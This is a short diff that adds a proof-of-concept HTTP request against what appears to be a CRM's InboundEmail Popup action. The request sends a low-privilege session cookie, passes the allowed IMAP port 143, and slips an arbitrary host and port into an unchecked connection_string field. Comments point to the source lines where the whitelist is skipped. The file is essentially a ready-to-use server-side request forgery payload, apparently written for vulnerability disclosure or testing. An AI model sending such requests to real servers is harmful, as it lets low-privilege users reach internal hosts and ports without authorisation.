@@ -1,0 +1,9 @@
+POST /index.php?module=InboundEmail&action=Popup&target=Popup HTTP/1.1
+Cookie: PHPSESSID=<low-priv-session>
+X-Requested-With: XMLHttpRequest
+
+module=InboundEmail&action=Popup&target=Popup&email_user=popuser_03f4c260&email_password=x&server_url=172.18.0.1&port=143&protocol=imap&ssl=false&connection_string=172.18.0.1:33119/imap/notls
+
+# port=143 passes the valid_imap_ports whitelist check (InboundEmail.php:6465);
+# connection_string is used verbatim by getConnectString() (:6407-6408) and is
+# NEVER checked against that whitelist -- it points at the real target instead.
